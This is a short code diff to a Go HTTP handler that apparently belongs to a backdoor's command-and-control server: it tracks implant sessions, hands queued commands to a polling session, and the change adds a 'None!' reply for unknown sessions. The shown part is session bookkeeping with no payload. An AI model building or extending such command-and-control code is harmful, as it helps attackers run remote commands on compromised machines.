@@ -227,8 +227,10 @@ func Handle(w http.ResponseWriter, r *http.Request) {
 		}
 		// fmt.Println("[127.0.0.1] New Backdoor established", SessionID,Self,Os)
 	} else if JOKER == "?" {
+		var found bool = false
 		for i:=0;i<len(sessions);i++ {
 			if sessions[i]._Auth == SessionID {
+				found = true
 				sessions[i]._Active = time.Now().UTC().Unix()
 				if _joker._connected == SessionID {
 					fmt.Fprintf(w, sessions[i]._command)
@@ -238,6 +240,11 @@ func Handle(w http.ResponseWriter, r *http.Request) {
 				sessions[i]._command="None"
 			}
 		}
+
+		if !found {
+			fmt.Fprintf(w, "None!")
+		}
+		
 	} else if JOKER == "+" {
 		for i:=0;i<len(sessions);i++ {
 			if sessions[i]._Auth == SessionID {
